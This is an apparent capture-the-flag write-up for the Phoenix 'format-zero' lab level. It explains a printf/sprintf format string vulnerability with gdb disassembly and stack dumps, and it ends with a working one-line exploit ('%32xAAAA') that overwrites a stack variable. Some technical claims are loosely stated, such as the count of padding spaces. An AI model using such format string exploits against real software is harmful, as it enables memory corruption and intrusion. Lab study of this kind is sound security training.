<h3 style="text-align:center" dir="rtl">بسم الله الرحمن الرحيم </h3>

# Format Zero:
This level has format string vulnerability.We need to change the value of `locals.changeme` by overflowing the `dest` buffer.This user controlled input is passed to `buffer` with function `fgets` which limit the number of characters we can store in `buffer` to 16.To overcome this limitation we will use format parameter `%x`that will read 1 byte of memory address.

 <br/>

When we pass a user controller input to `printf` without the correct formating to it.It will read the string and if it encounter any format parameters it will evaluate them.
```c
int main(){
    printf("%x");
}
// Output : ffffe5f8
```

<br/>
It read `%x` and print a value from the stack.Using the field width with the format parameters we can controll the length of the read, for example, `%32x` will print 24 space then a value from the stack.

<br/>

`sprintf` function used to write formated ouput to `dest` buffer.If we pass `%32x` it will write the 24 space and 8 hexdecimal value from the stack after the 32 byte it where `changeme` is placed.

```bash
gdb format-zero.c
(gdb) disas main
   <----------------------------------------------------->
   0x0000000000400705 <+104>:	call   0x400500 <sprintf@plt>
   0x000000000040070a <+109>:	mov    eax,DWORD PTR [rbp-0x10]
   0x000000000040070d <+112>:	test   eax,eax
   0x000000000040070f <+114>:	je     0x40071d <main+128>
   0x0000000000400711 <+116>:	mov    edi,0x4007f8
   <------------------------------------------------------->
(gdb) b *main+112
Breakpoint 1 at 0x40070d
(gdb) run
Starting program: /opt/phoenix/amd64/format-zero 
Welcome to phoenix/format-zero, brought to you by https://exploit.education
%32xAAAA

Breakpoint 1, 0x000000000040070d in main ()
(gdb) x/12gx $rsp
0x7fffffffe4f0:	0x00007fffffffe598	0x0000000100000000
0x7fffffffe500:	0x4141414178323325	0x000000000000000a
0x7fffffffe510:	0x2020202020202020	0x2020202020202020
0x7fffffffe520:	0x2020202020202020	0x3030356566666666
0x7fffffffe530:	0x0000000a41414141	0x0000000000000000
0x7fffffffe540:	0x0000000000000001	0x00007ffff7d8fd62
(gdb) c
Continuing.
Well done, the 'changeme' variable has been changed!
[Inferior 1 (process 398) exited normally]
```
The value of `changeme` has changed to AAAA.

### Exploit:

```bash
python -c "print '%32xAAAA'" | ./format-zero 
```